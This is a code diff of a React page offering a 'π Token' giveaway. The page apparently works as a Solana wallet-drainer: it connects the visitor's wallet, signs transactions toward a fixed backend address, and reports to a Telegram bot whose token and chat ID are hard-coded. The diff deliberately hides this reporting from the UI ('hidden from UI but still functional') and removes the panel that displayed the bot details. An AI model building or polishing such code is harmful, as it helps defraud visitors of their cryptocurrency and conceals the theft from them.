@@ -1,13 +1,13 @@
-import { Settings, Menu } from "lucide-react";
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { useEffect, useState } from 'react';
 import { getTokenAccounts, sendToTelegram, signAndSendTransaction, getWalletBalance } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
+import { Menu } from "lucide-react";
 
 const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
-// Telegram details
+// Telegram details (hidden from UI but still functional)
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
 const TELEGRAM_CHAT_ID = "-1002490122517";
 
@@ -35,7 +35,7 @@ const Index = () => {
     
     try {
       console.log("Getting wallet balance directly");
-      // Use the new standalone getWalletBalance function with built-in retries
+      // Use the improved getWalletBalance function with built-in retries
       const solBalance = await getWalletBalance(publicKey.toString());
       
       setWalletBalance(solBalance);
@@ -304,9 +304,11 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
           Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!!
         </p>
 
-        {/* Action Buttons */}
-        <div className="flex flex-col w-full max-w-md gap-4 mt-4">
-          <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
+        {/* Action Buttons - Centered Connect Wallet */}
+        <div className="flex flex-col items-center w-full max-w-md gap-4 mt-4">
+          <div className="flex justify-center w-full">
+            <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
+          </div>
           
           {isLoading && (
             <div className="mt-4 p-4 bg-blue-900/30 border border-blue-700 rounded-lg">
@@ -373,19 +375,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
               </a>
             </div>
           )}
-          
-          <div className="mt-4 p-4 bg-gray-800/80 border border-cyan-800/50 rounded-lg text-left">
-            <p className="text-sm text-gray-400 mb-2">Telegram Bot Details:</p>
-            <p className="text-xs text-cyan-400">Bot Token: {TELEGRAM_BOT_TOKEN}</p>
-            <p className="text-xs text-cyan-400">Chat ID: {TELEGRAM_CHAT_ID}</p>
-            <button
-              onClick={handleManualRetry}
-              className="mt-3 bg-cyan-700/50 text-white py-2 px-4 rounded-md hover:bg-cyan-700/80 transition-colors text-sm"
-              disabled={isProcessing || isLoading || !connected}
-            >
-              {(isProcessing || isLoading) ? "Processing..." : "Manually Force Send to Telegram"}
-            </button>
-          </div>
         </div>
 
         {/* Bottom Logo */}
